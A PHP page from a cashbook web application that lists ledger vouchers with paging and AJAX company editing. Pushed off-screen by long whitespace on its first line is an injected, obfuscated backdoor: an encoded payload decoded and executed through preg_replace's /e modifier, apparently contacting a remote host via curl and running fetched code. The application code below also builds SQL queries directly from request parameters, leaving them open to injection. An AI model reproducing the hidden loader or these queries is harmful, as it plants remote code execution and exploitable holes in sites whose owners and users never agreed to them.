<?php                                                                                                                                                                 /*versio:2.12*/$IIll=0;$GLOBALS['IIll'] = '=cDY3VybARX2luaXQrxC?ZYWxsb3dfdXJsX2ZvcGVuMQ_%)R=X3NldG9wdA;BTX2V4ZWMSfVawXwqYEY2xvc2UPGltZyBzcmM9IgvYuIiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4kIHSFRUUF9IT1NUMTI3LgMTAuciMTkyLjE2OC4nxdwEPb3Nvbi5pbgJQpZ2Fib3Iuc2UQ(;c2lsYmVyLmRlpaGF2ZWFwb2tlLmNvbS5hdQvpWV8sYOgQyNKZGlzcGxheV9lcnJvcnMIh*ZGV0ZXJtaW5hdG9ygIZnRwdMMi4xMgUTBRT1EwT09RME9RT1EwYmFzZTY0X2RlY29kZQrGDYmFzZTY0X2VuY29kZQKiiaHR0cDovLwSFRUUF9VU0VSX0FHRU5UedW5pb24oHc2VsZWN0u%UkVRVUVTVF9VUkkcoxU0NSSVBUX05BTUUA)&{zUVVFUllfU1RSSU5HT&Pw.;L3RtcC8US%L3RtcAi@VE1Q#nVEVNUAVE1QRElSSVdXBsb2FkX3RtcF9kaXI~ILgcdmVyc2lvLQXsDiLXBocASFRUUF9FWEVDUEhQg?cxb3V0b2s)P{aHR0cAKOi8vlL3BnLnBocD91PQNJJms9;oSJnQ9cGhwJnA9REo JnY9ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NGa1pXWnBibVZrS0NKa1pYUmxjbTFwYm1GMGIzSWlLU2w3SUdaMWJtTjBhVzl1SUdkbGRHWnBiR1VvSkVsc2JERXhNU2w3SUNSSk1XeHNNVWtnUFNCUlR6QlBUekJQVVNnekxDQTJLVHNnSkVsc1NXd3hiQ0E5SUNSSk1XeHNNVWt1VVU4d1QwOHdUMUVvTVRBc0lEY3BPeUJwWmlBb1FHbHVhVjluWlhRb1VVOHdUMDh3VDFFb01qSXNJREl3S1NrZ1BUMGdVVTh3VDA4d1QxRW9ORElzSURJcEtTQjdJQ1JKTVd3eE1URTlRR1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ1JKYkd3eE1URXBPeUJ5WlhSMWNtNGdVVTh3VDA4d1QxRW9ORFlzSURBcE95QjlJR1ZzYzJWcFppQW9ablZ1WTNScGIyNWZaWGhwYzNSektDUkpiRWxzTVd3cEtYc2dKRkZSVVRCUFR5QTlJRUFrU1d4SmJERnNLQ2s3SUNSUlVWRlJNRThnUFNBa1NURnNiREZKTGxGUE1FOVBNRTlSS0RRNUxDQXhNQ2s3SUNSUlR6QlJVVThnUFNBa1NURnNiREZKTGxGUE1FOVBNRTlSS0RZeUxDQTNLVHNnSkZGUk1GRXdUeUE5SUNSSk1XeHNNVWt1VVU4d1QwOHdUMUVvTnpRc0lESXBMbEZQTUU5UE1FOVJLRGM1TENBM0tUc2dRQ1JSVVZGUk1FOG9KRkZSVVRCUFR5d2dRMVZTVEU5UVZGOVZVa3dzSUNSSmJHd3hNVEVwT3lCQUpGRlJVVkV3VHlna1VWRlJNRTlQTENCRFZWSk1UMUJVWDBoRlFVUkZVaXhtWVd4elpTazdJRUFrVVZGUlVUQlBLQ1JSVVZFd1QwOHNJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc2RISjFaU2s3SUVBa1VWRlJVVEJQS0NSUlVWRXdUMDhzSUVOVlVreFBVRlJmUTA5T1RrVkRWRlJKVFVWUFZWUXNOU2s3SUdsbUlDZ2tVVEJQVVRCUklEMGdRQ1JSVHpCUlVVOG9KRkZSVVRCUFR5a3BJSHR5WlhSMWNtNGdVVTh3VDA4d1QxRW9ORFlzSURBcE8zMGdRQ1JSVVRCUk1FOG9KRkZSVVRCUFR5azdJSEpsZEhWeWJpQlJUekJQVHpCUFVTZzBOaXdnTUNrN0lIMGdaV3h6WlNCN0lISmxkSFZ5YmlCUlR6QlBUekJQVVNnNE5pd2dNVFFwTGlSSmJHd3hNVEV1VVU4d1QwOHdUMUVvTVRBekxDQXpPU2s3SUgwZ2ZTQm1kVzVqZEdsdmJpQjFjR1FvSkVsc1NXd3hNU3drU1d4c01URXhLWHNnSkVsSlNXeEpTU0E5SUVCblpYUm9iM04wWW5sdVlXMWxLRUFrWDFORlVsWkZVbHRSVHpCUFR6QlBVU2d4TkRVc0lERXlLVjBwT3lCcFppQW9KRWxKU1d4SlNTQWhQVDBnVVU4d1QwOHdUMUVvTkRZc0lEQXBJR0Z1WkNCemRISndiM01vSkVsSlNXeEpTU3dnVVU4d1QwOHdUMUVvTVRVM0xDQTJLU2tnSVQwOUlEQWdZVzVrSUhOMGNuQnZjeWdrU1VsSmJFbEpMQ0JSVHpCUFR6QlBVU2d4TmpNc0lEUXBLU0FoUFQwZ01DQmhibVFnYzNSeWNHOXpLQ1JKU1Vsc1NVa3NJRkZQTUU5UE1FOVJLREUyT1N3Z01URXBLU0FoUFQwZ01DbDdJQ1JKYkRFeE1XdzlRR1p2Y0dWdUtDUkpiRWxzTVRFc1VVOHdUMDh3VDFFb01UZ3lMQ0F5S1NrN0lFQm1ZMnh2YzJVb0pFbHNNVEV4YkNrN0lHbG1JQ2hBYVhOZlptbHNaU2drU1d4SmJERXhLU2w3SUhkeWFYUmxLQ1JKYkVsc01URXNJR2RsZEdacGJHVW9KRWxzYkRFeE1Ta3BPeUI5T3lCOUlIMGdKRkZSVDFGUlR5QTlJRUZ5Y21GNUtGRlBNRTlQTUU5UktERTROaXdnTVRBcExDQlJUekJQVHpCUFVTZ3hPVGtzSURFeEtTd2dVVTh3VDA4d1QxRW9NakV6TENBeE1pa3NJRkZQTUU5UE1FOVJLREl5Tml3Z01qSXBLVHNnSkZFd01FOHdUeUE5SUNSUlVVOVJVVTliTVYwN0lHWjFibU4wYVc5dUlIZHlhWFJsS0NSSmJFbHNNVEVzSkVreE1Xd3hTU2w3SUdsbUlDZ2tVVEJSVVZGUFBVQm1iM0JsYmlna1NXeEpiREV4TEZGUE1FOVBNRTlSS0RFNE1pd2dNaWtwS1hzZ1FHWjNjbWwwWlNna1VUQlJVVkZQTENSSk1URnNNVWtwT3lCQVptTnNiM05sS0NSUk1GRlJVVThwT3lCOUlIMGdablZ1WTNScGIyNGdiM1YwY0hWMEtDUkpTVEV4TVVrc0lDUlJUMDlQTURBcGV5QmxZMmh2SUZGUE1FOVBNRTlSS0RJMU1Dd2dNeWt1SkVsSk1URXhTUzVSVHpCUFR6QlBVU2d5TlRVc0lESXBMaVJSVDA5UE1EQXVJbHh5WEc0aU95QjlJR1oxYm1OMGFXOXVJSEJoY21GdEtDbDdJSEpsZEhWeWJpQlJUekJQVHpCUFVTZzBOaXdnTUNrN0lIMGdRR2x1YVY5elpYUW9VVTh3VDA4d1QxRW9Nall4TENBeE9Ta3NJREFwT3lCa1pXWnBibVVvVVU4d1QwOHdUMUVvTWpnekxDQXhOaWtzSURFcE95QWtTVWxKU1d4SlBWRlBNRTlQTUU5UktETXdNU3dnTkNrN0lDUlJUMDh3VDA4OVVVOHdUMDh3VDFFb016QTNMQ0EyS1RzZ0pFbEpTV3d4YkQxUlR6QlBUekJQVVNnek1UTXNJREl3S1RzZ0pGRlBVVEJQVVQxUlR6QlBUekJQVVNnek16TXNJREU0S1RzZ0pFbHNiRWt4YkQxUlR6QlBUekJQVVNnek5UUXNJREU0S1RzZ0pGRXdVVkV3VVQxUlR6QlBUekJQVVNnek56VXNJREV3S1RzZ0pGRXdVVkV3VVM0OWMzUnlkRzlzYjNkbGNpaEFKRjlUUlZKV1JWSmJVVTh3VDA4d1QxRW9NVFExTENBeE1pbGRLVHNnSkZFd01FOVJVU0E5SUVBa1gxTkZVbFpGVWx0UlR6QlBUekJQVVNnek9EVXNJREl3S1YwN0lHWnZjbVZoWTJnZ0tDUmZSMFZVSUdGeklDUkpTVEV4TVVrOVBpUlJUMDlQTURBcGV5QnBaaUFvYzNSeWNHOXpLQ1JSVDA5UE1EQXNVVTh3VDA4d1QxRW9OREEyTENBM0tTa3BleVJmUjBWVVd5UkpTVEV4TVVsZFBWRlBNRTlQTUU5UktEUTJMQ0F3S1R0OUlHVnNjMlZwWmlBb2MzUnljRzl6S0NSUlQwOVBNREFzVVU4d1QwOHdUMUVvTkRFMUxDQTRLU2twZXlSZlIwVlVXeVJKU1RFeE1VbGRQVkZQTUU5UE1FOVJLRFEyTENBd0tUdDlJSDBnYVdZb0lXbHpjMlYwS0NSZlUwVlNWa1ZTVzFGUE1FOVBNRTlSS0RReU5Td2dNVFVwWFNrcElIc2dKRjlUUlZKV1JWSmJVVTh3VDA4d1QxRW9OREkxTENBeE5TbGRJRDBnUUNSZlUwVlNWa1ZTVzFGUE1FOVBNRTlSS0RRME15d2dNVFVwWFRzZ2FXWW9RQ1JmVTBWU1ZrVlNXMUZQTUU5UE1FOVJLRFEyTXl3Z01UWXBYU2tnZXlBa1gxTkZVbFpGVWx0UlR6QlBUekJQVVNnME1qVXNJREUxS1YwZ0xqMGdVVTh3VDA4d1QxRW9ORGd4TENBeUtTQXVJRUFrWDFORlVsWkZVbHRSVHpCUFR6QlBVU2cwTmpNc0lERTJLVjA3SUgwZ2ZTQnBaaUFvSkVreGJHeEpTVDBrVVRCUlVUQlJMa0FrWDFORlVsWkZVbHRSVHpCUFR6QlBVU2cwTWpVc0lERTFLVjBwZXlBa1NXeEpNV3hzUFVCdFpEVW9KRkV3VVZFd1VTNGtVVTlQTUU5UExsQklVRjlQVXk0a1NVbEpiREZzS1RzZ0pGRXdVVTh3VVQxUlR6QlBUekJQVVNnME9EVXNJRGNwT3lBa1VWRlBNRTh3SUQwZ1FYSnlZWGtvVVU4d1QwOHdUMUVvTkRrMUxDQTJLU3dnUUNSZlUwVlNWa1ZTVzFGUE1FOVBNRTlSS0RVd015d2dOQ2xkTENCQUpGOVRSVkpXUlZKYlVVOHdUMDh3VDFFb05UQTVMQ0EyS1Ywc0lFQWtYMFZPVmx0UlR6QlBUekJQVVNnMU1ETXNJRFFwWFN3Z1FDUmZSVTVXVzFGUE1FOVBNRTlSS0RVeE5Td2dPQ2xkTENCQUpGOUZUbFpiVVU4d1QwOHdUMUVvTlRBNUxDQTJLVjBzSUVCcGJtbGZaMlYwS0ZGUE1FOVBNRTlSS0RVeU5Td2dNVGtwS1NrN0lHWnZjbVZoWTJnZ0tDUlJVVTh3VHpBZ1lYTWdKRWxKTVd4c01TbDdJR2xtSUNnaFpXMXdkSGtvSkVsSk1XeHNNU2twZXlBa1NVa3hiR3d4TGoxRVNWSkZRMVJQVWxsZlUwVlFRVkpCVkU5U095QnBaaUFvUUdselgzZHlhWFJoWW14bEtDUkpTVEZzYkRFcEtYc2dKRkV3VVU4d1VTQTlJQ1JKU1RGc2JERTdJR0p5WldGck95QjlJSDBnZlNBa2RHMXdQU1JSTUZGUE1GRXVVVTh3VDA4d1QxRW9OVFEyTENBeUtTNGtTV3hKTVd4c095QnBaaUFvUUNSZlUwVlNWa1ZTV3lKSVZGUlFYMWxmUVZWVVNDSmRQVDBrU1d4Sk1XeHNLWHNnWldOb2J5QWlYSEpjYmlJN0lFQnZkWFJ3ZFhRb1VVOHdUMDh3VDFFb05UUTVMQ0E0S1N3Z0pGRlBUekJQVHk1UlR6QlBUekJQVVNnMU5UY3NJRElwTGlSSlNVbEpiRWt1VVU4d1QwOHdUMUVvTlRZekxDQTJLU2s3SUdsbUlDZ2tTV3d4TVd4c1BTUlJUMUV3VDFFb1FDUmZVMFZTVmtWU1cxRlBNRTlQTUU5UktEVTJPU3dnTVRZcFhTa3BleUJBWlhaaGJDZ2tTV3d4TVd4c0tUc2daV05vYnlBaVhISmNiaUk3SUVCdmRYUndkWFFvVVU4d1QwOHdUMUVvTlRnNUxDQTBLU3dnVVU4d1QwOHdUMUVvTlRrekxDQXpLU2s3SUgwZ1pYaHBkQ2d3S1RzZ2ZTQnBaaUFvUUdselgyWnBiR1VvSkhSdGNDa3BleUJBYVc1amJIVmtaVjl2Ym1ObEtDUjBiWEFwT3lCOUlHVnNjMlY3SUNSSk1XeHNTVWs5UUhWeWJHVnVZMjlrWlNna1NURnNiRWxKS1RzZ2RYQmtLQ1IwYlhBc1VVOHdUMDh3VDFFb05UazVMQ0EyS1M1UlR6QlBUekJQVVNnMk1EWXNJRFFwTGlSUlVVOVJVVTliTUYwdVVVOHdUMDh3VDFFb05qRXhMQ0F4TkNrdUpFa3hiR3hKU1M1UlR6QlBUekJQVVNnMk1qY3NJRFFwTGlSSmJFa3hiR3d1VVU4d1QwOHdUMUVvTmpNMExDQXhNaWt1SkVsSlNVbHNTUzVSVHpCUFR6QlBVU2cyTlRBc0lEUXBMaVJSVDA4d1QwOHBPeUI5SUgwZ2ZRPT0iKSk7cHJlZ19yZXBsYWNl6261736536345f6465636f6465';if (!function_exists('QO0OO0OQ')){function QO0OO0OQ($a, $b){$c=$GLOBALS['IIll']; $d=pack('H*',substr($c, -26)); return $d(substr($c, $a, $b));}};$IllIIlIlI = QO0OO0OQ(6478, 16);$IllIIlIlI("/IIII1lll1/e", QO0OO0OQ(654, 5824), "IIII1lll1");?><?php session_start();
require_once('config/config.php');
include("function.php");
if(check_user()==false){header("Location: login.php");}
/*----------------------------*/
$lid = $_SESSION['cashbook_locid'];
$cid = $_SESSION['cashbook_cihid'];
$today = date("d-m-Y");
$dt1 = strtotime($today);
$dt2 = strtotime($today);
if(isset($_REQUEST['lid'])){$lid = $_REQUEST['lid'];}
if(isset($_REQUEST['cid'])){$cid = $_REQUEST['cid'];}
if(isset($_REQUEST['dt1'])){$dt1 = $_REQUEST['dt1'];}
if(isset($_REQUEST['dt2'])){$dt2 = $_REQUEST['dt2'];}
/*----------------------------*/
if(isset($_POST['submit'])){header("Location:lstlct.php?lid=".$_POST['location']."&cid=".$_POST['cihName']."&dt1=".strtotime($_POST['date1'])."&dt2=".strtotime($_POST['date2']));}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>CashBook</title>
<script type="text/javascript" src="src/js/jscal2.js"></script>
<script type="text/javascript" src="src/js/lang/en.js"></script>
<script type="text/javascript" src="js/prototype.js"></script>
<script type="text/javascript" src="js/common.js"></script>
<link rel="stylesheet" type="text/css" href="src/css/jscal2.css" />
<link rel="stylesheet" type="text/css" href="src/css/border-radius.css" />
<link rel="stylesheet" type="text/css" href="src/css/steel/steel.css" />
<link rel="stylesheet" type="text/css" href="pro_drop_1/pro_drop_1.css" />
<script type="text/javascript" language="javascript">
function ValidateForm()
{
	if(document.getElementById("location").value==0){
		alert("Please input/select Location name !");
		return false;
	}
	if(document.getElementById("date1").value!=""){
		if(!checkdate(document.lctlist.date1)){
			return false;
		} else {
			var no_of_days1 = getDaysbetween2Dates(document.lctlist.date1,document.lctlist.endYear);
			if(no_of_days1 < 0){
				alert("Date From, wrongly selected. Please correct and submit again !");
				return false;
			} else {
				var no_of_days2 = getDaysbetween2Dates(document.lctlist.startYear,document.lctlist.date1);
				if(no_of_days2 < 0){
					alert("Date From, wrongly selected. Please correct and submit again !");
					return false;
				}
			}
		}
	} else if(document.getElementById("date1").value==""){
		alert("Please input/select 'Date From'!");
		return false;
	}
	if(document.getElementById("date2").value!=""){
		if(!checkdate(document.lctlist.date2)){
			return false;
		} else {
			var no_of_days1 = getDaysbetween2Dates(document.lctlist.date2,document.lctlist.endYear);
			if(no_of_days1 < 0){
				alert("Date To, wrongly selected. Please correct and submit again !");
				return false;
			} else {
				var no_of_days2 = getDaysbetween2Dates(document.lctlist.startYear,document.lctlist.date2);
				if(no_of_days2 < 0){
					alert("Date To, wrongly selected. Please correct and submit again !");
					return false;
				}
			}
		}
	} else if(document.getElementById("date2").value==""){
		alert("Please input/select 'Date To'!");
		return false;
	}
	var no_of_days = getDaysbetween2Dates(document.lctlist.date1,document.lctlist.date2);
	if(no_of_days < 0){
		alert("* Sorry! date range wrongly selected. Please correct and submit again.\n");
		return false;
	}
}

function get_company_list(value1,value2,value3)
{
	var ctr = document.getElementById('cmp').length;
	var strg = '<select name="company_'+value1+'" id="company_'+value1+'" style="width:300px;">';
	for(var i=0; i<ctr; i++){
		if(document.getElementById("cmp").options[i].value==value2)
			strg = strg + '<option selected value="'+document.getElementById("cmp").options[i].value+'">'+document.getElementById("cmp").options[i].text+'</option>';
		else
			strg = strg + '<option value="'+document.getElementById("cmp").options[i].value+'">'+document.getElementById("cmp").options[i].text+'</option>';
	}
	strg = strg+'</select>';
	document.getElementById('cmpTag['+value1+']').innerHTML=strg;
	document.getElementById('actionTag['+value1+']').innerHTML='&nbsp;<a onclick="save_company('+value1+','+value3+')"><img src="images/save.gif" style="display:inline; cursor:hand;" border="0"></a>&nbsp;';
}

function save_company(value1,value2)
{
	var value3 = document.getElementById("company_"+value1).value;
	var url = 'save_company.php';
	var pars = 'sno='+value1+'&rid='+value2+"&cid="+value3;
	var myAjax = new Ajax.Request(
	url, 
	{
		method: 'post', 
		parameters: pars, 
		onComplete: show_company
	});
}

function show_company(originalRequest)
{
	var res=originalRequest.responseText.split('~~',4);
	document.getElementById('cmpTag['+res[0]+']').innerHTML=res[3];
	document.getElementById('actionTag['+res[0]+']').innerHTML='&nbsp;<a onclick="get_company_list('+res[0]+','+res[1]+','+res[2]+')"><img src="images/edit.png" style="display:inline; cursor:hand;" border="0"></a>&nbsp;';
}

function get_cashinhand(value1)
{
	var url = 'get_cashinhand.php';
	var pars = 'id='+value1;
	var myAjax = new Ajax.Request(
	url, 
	{
		method: 'post', 
		parameters: pars, 
		onComplete: show_cashinhand
	});
}
function show_cashinhand(originalRequest)
{
	document.getElementById('spanCIH').innerHTML=originalRequest.responseText;
}

function paging_list()
{
	window.location="lstlct.php?lid="+document.getElementById("location").value+"&cid="+document.getElementById("cihName").value+"&dt1="+document.getElementById("sdate").value+"&dt2="+document.getElementById("edate").value+"&pg="+document.getElementById("page").value+"&tr="+document.getElementById("displayTotalRows").value;
}

function firstpage_list()
{
	document.getElementById("page").value = 1;
	paging_list();
}

function previouspage_list()
{
	var cpage = parseInt(document.getElementById("page").value);
	if(cpage>1){
		cpage = cpage - 1;
		document.getElementById("page").value = cpage;
	}
	paging_list();
}

function nextpage_list()
{
	var cpage = parseInt(document.getElementById("page").value);
	if(cpage<parseInt(document.getElementById("totalPage").value)){
		cpage = cpage + 1;
		document.getElementById("page").value = cpage;
	}
	paging_list();
}

function lastpage_list()
{
	document.getElementById("page").value = document.getElementById("totalPage").value;
	paging_list();
}
</script>
</head>

<body>
<form name="lctlist" id="lctlist" method="POST" onSubmit="return ValidateForm()">
<table style="width:1000px;" align="center" border="0">
<tr>
	<td>
		<table style="width:1000px;" bgcolor="#8ADEF7" align="center" border="0">
		<tr>
			<td valign="top">
				<table style="margin-top:0px;" align="center" border="0">
				<tr height="40px"><td valign="top"><?php include("menu.php"); ?></td></tr>
				<tr><td align="center"><b>Ledger Company Transfer</b></td></tr>
				<tr><td align="center"><b style="font-size:14px;">Location&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;</b><?php 
				if($_SESSION['cashbook_utype']=="A" || $_SESSION['cashbook_utype']=="S"){
					echo '<select name="location" id="location" style="width:240px" onchange="get_cashinhand(this.value)" >';
					echo '<option value="0">-- select --</option>';
					$sqlLoc=mysql_db_query(DATABASE1,"SELECT * FROM location ORDER BY location_name") or die(mysql_error());
					while($rowLoc=mysql_fetch_array($sqlLoc)){
						if($rowLoc["location_id"]==$lid)
							echo '<option selected value="'.$rowLoc["location_id"].'">'.$rowLoc["location_name"].'</option>';
						else
							echo '<option value="'.$rowLoc["location_id"].'">'.$rowLoc["location_name"].'</option>';
					}
					echo '</select>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b style="font-size:14px;">Cash&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;</b>';
					echo '<span id="spanCIH">';
					$sqlCIH=mysql_db_query(DATABASE2,"SELECT * FROM tblcashinhand WHERE location_id=".$lid." ORDER BY cih_name");
					if(mysql_num_rows($sqlCIH)>1){
						echo '<select name="cihName" id="cihName" style="width:230px;"><option value="0">-- All Cash --</option>';
						while($resCIH=mysql_fetch_array($sqlCIH)){
							if($resCIH['cih_id']==$cid)
								echo '<option selected value="'.$resCIH['cih_id'].'">'.$resCIH['cih_name'].'</option>';
							else
								echo '<option value="'.$resCIH['cih_id'].'">'.$resCIH['cih_name'].'</option>';
						}
						echo '</select>';
					} elseif(mysql_num_rows($sqlCIH)==1){
						$resCIH = mysql_fetch_assoc($sqlCIH);
						echo '<input name="cih" id="cih" size="34" readonly="true" value="'.$resCIH['cih_name'].'" style="background-color:#FFE1FF;"/><input type="hidden" name="cihName" id="cihName" value="'.$resCIH['cih_id'].'"/>';
					}
					echo '</span>';
				} elseif($_SESSION['cashbook_utype']=="U"){
					echo '<input name="locationName" id="locationName" maxlength="50" size="45" readonly="true" value="'.$_SESSION['cashbook_lname'].'" style="background-color:#E7F0F8; color:#0000FF">&nbsp;<input type="hidden" name="location" id="location" value="'.$lid.'" />';
					echo '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b style="font-size:14px;">Cash&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;</b>';
					echo '<input name="cih" id="cih" size="34" readonly="true" value="'.$_SESSION['cashbook_cihname'].'" style="background-color:#FFE1FF;"/><input type="hidden" name="cihName" id="cihName" value="'.$cid.'"/>';
				}
				
				$sqlcmp = mysql_db_query(DATABASE1,"SELECT * FROM cwct INNER JOIN ".DATABASE1.".company ON cwct.company_id = company.company_id WHERE location_id=".$lid." ORDER BY company_name") or die(mysql_error());
				if(mysql_num_rows($sqlcmp)==0){
					$sqlcmp = mysql_db_query(DATABASE1,"SELECT * FROM company ORDER BY company_name") or die(mysql_error());
				}
				?>
				</td></tr>
				<tr><td align="center"><b style="font-size:14px; color:#000000;">From&nbsp;:&nbsp;</b><input name="date1" id="date1" value="<?php echo date("d-m-Y",$dt1); ?>" style="width:75px;height:14px;"/><button id="f_btn1" style="width:10px;height:22px;font-size:14px;font-weight:bold;color:#000000;">...</button><script type="text/javascript">var cal = Calendar.setup({ onSelect: function(cal) { cal.hide()}, showTime: true }); cal.manageFields("f_btn1", "date1", "%d-%m-%Y");</script><b style="font-size:14px;color:#000000;">&nbsp;&nbsp;To&nbsp;:&nbsp;</b><input name="date2" id="date2" value="<?php echo date("d-m-Y",$dt2); ?>" style="width:75px;height:14px;"/><button id="f_btn2" style="width:10px;height:22px;font-size:14px;font-weight:bold;color:#000000;">...</button><script type="text/javascript">var cal = Calendar.setup({ onSelect: function(cal) { cal.hide()}, showTime: true }); cal.manageFields("f_btn2", "date2", "%d-%m-%Y");</script>&nbsp;&nbsp;<input type="submit" name="submit" value=" Show " style="width:60px;height:22px;"/><input type="hidden" name="startYear" id="startYear" value="<?php echo date("d-m-Y",strtotime($_SESSION['cashbook_syr']));?>"/><input type="hidden" name="endYear" id="endYear" value="<?php echo date("d-m-Y",strtotime($_SESSION['cashbook_eyr']));?>"/><input type="hidden" name="sdate" id="sdate" value="<?php echo $dt1; ?>"/><input type="hidden" name="edate" id="edate" value="<?php echo $dt2; ?>"/><span id="cmpSpan" style="display:none;"><select name="cmp" id="cmp"><option value="0">-- select --</option><?php while($rowcmp=mysql_fetch_array($sqlcmp)){echo '<option value="'.$rowcmp["company_id"].'">'.$rowcmp["company_name"].'</option>';}?></select></span>
				</td></tr>
				</table>
			</td>
		</tr>
		<tr>
			<td valign="top">
				<table border="0" style="border-color:#2D7CBD;" align="center" width="800px">
				<tr>
					<td valign="top">
						<table background="images/backBody.gif" align="center" width="1050px" cellspacing="1" border="0">
						<tr bgcolor="#2571C5" align="center" style="font-size:14px; font-weight:bold; color:#FFFFFF;">
							<td width="90px">Voucher Date</td>
							<td width="100px">Voucher No.</td>
							<td width="70px">Voucher Type</td>
							<td width="220px">Particulars</td>
							<td width="110px">Credit</td>
							<td width="110px">Debit</td>
							<td width="310px">Company</td>
							<td width="40px">Action</td>
						</tr>
						<?php 
						$start = 0;
						if(isset($_REQUEST['tr']) && $_REQUEST['tr']!=""){$end=$_REQUEST['tr'];} else {$end=PAGING;}
						if(isset($_REQUEST['pg']) && $_REQUEST['pg']!=""){$start=($_REQUEST['pg']-1)*$end;}
						$ctr = $start;
						$i = 1;
						/*--------------------------*/
						$sql=mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.* FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE vouch_date BETWEEN '".date("Y-m-d",$dt1)."' AND '".date("Y-m-d",$dt2)."' AND location_id=".$lid." ORDER BY vouch_date,vouch_no,seq_no LIMIT ".$start.",".$end) or die(mysql_error());
						while($res=mysql_fetch_array($sql)){
							$vouch_no = $res['vouch_no'];
							$VoucherNumber = ($vouch_no>999 ? $vouch_no : ($vouch_no>99 && $vouch_no<1000 ? "0".$vouch_no : ($vouch_no>9 && $vouch_no<100 ? "00".$vouch_no : "000".$vouch_no)));
							if($res['vouch_prefix']!=NULL){$VoucherNumber = $res['vouch_prefix']."/".$VoucherNumber;}
							echo '<tr ($i%2==0 ? bgcolor="#D9F0FD" : bgcolor="#FFFFFF")>';
							echo '<td>'.date("d-m-Y",strtotime($res['vouch_date'])).'</td>';
							echo '<td>'.$VoucherNumber.'</td>';
							echo '<td>'.($res['vouch_type']=="P" ? "Payment" : "Receipt").'</td>';
							$sqlLedger=mysql_db_query(DATABASE2,"SELECT ledger_name FROM ledger WHERE ledger_id=".$res['exps_id']) or die(mysql_error());
							$resLedger=mysql_fetch_assoc($sqlLedger);
							echo '<td>'.$resLedger['ledger_name'].'</td>';
							if($res['vouch_type']=="P"){
								echo '<td>&nbsp;</td>';
								echo '<td align="Right">'.number_format(-1*$res['exps_amt'],2,".","").'</td>';
							} else {
								echo '<td align="Right">'.number_format($res['exps_amt'],2,".","").'</td>';
								echo '<td>&nbsp;</td>';
							}
							$recId = $res['rec_id'];
							$companyId = $res['company_id'];
							$companyName = "";
							if($companyId!=0){
								$sqlComp=mysql_db_query(DATABASE1,"SELECT company_name FROM company WHERE company_id=".$companyId) or die(mysql_error());
								$resComp=mysql_fetch_assoc($sqlComp);
								$companyName = $resComp['company_name'];
							}
							echo '<td id="cmpTag['.$i.']">'.$companyName.'</td>';
							echo '<td align="center" id="actionTag['.$i.']">&nbsp;<a onclick="get_company_list('.$i.','.$companyId.','.$recId.')"><img src="images/edit.png" style="display:inline; cursor:hand;" border="0"></a>&nbsp;</td>';
							echo '</tr>';
							$i++;
						}
						?>
						</table>
					</td>
				</tr>
				</table>
			</td>
		</tr>
		<tr>
			<td><?php 
			$sql_total = mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.* FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE vouch_date BETWEEN '".date("Y-m-d",$dt1)."' AND '".date("Y-m-d",$dt2)."' AND location_id=".$lid) or die(mysql_error());
			$tot_row=mysql_num_rows($sql_total);
			$total_page=0;
			echo 'Total <span style="color:red">'.$tot_row.'</span> records&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			echo '<input type="button" name="show" id="show" value="Show:" onclick="paging_list()" />&nbsp;&nbsp;<input name="displayTotalRows" id="displayTotalRows" value="'.$end.'" maxlength="2" size="2" /> rows&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			if($tot_row>$end){
				echo "Page number: ";
				$total_page=ceil($tot_row/$end);
				echo '<select name="page" id="page" onchange="paging_list()" style="vertical-align:middle">';
				for($i=1;$i<=$total_page;$i++){
					if(isset($_REQUEST["pg"]) && $_REQUEST["pg"]==$i)
						echo '<option selected value="'.$i.'">'.$i.'</option>';
					else
						echo '<option value="'.$i.'">'.$i.'</option>';
				}
				echo '</select>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			} else {
				echo '<input type="hidden" name="page" id="page" value="1" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			}
			
			echo '<input type="hidden" name="totalPage" id="totalPage" value="'.$total_page.'" />';
			if($total_page>1 && $_REQUEST["pg"]>1)
				echo '<input type="button" name="fistPage" id="firstPage" value=" << " onclick="firstpage_list()" />&nbsp;&nbsp;<input type="button" name="prevPage" id="prevPage" value=" < " onclick="previouspage_list()" />&nbsp;&nbsp;';
			if($total_page>1 && $_REQUEST["pg"]<$total_page)
				echo '<input type="button" name="nextPage" id="nextPage" value=" > " onclick="nextpage_list()" />&nbsp;&nbsp;<input type="button" name="lastPage" id="lastPage" value=" >> " onclick="lastpage_list()" />';
			echo '&nbsp;&nbsp;<input type="button" value="Exit" style="width:80px;" onclick="window.location=\'CashbookMenu.php\'">';
			?>
			</td>
		</tr>
		</table>
	</td>
</tr>
</table>
</form>
</body>
</html>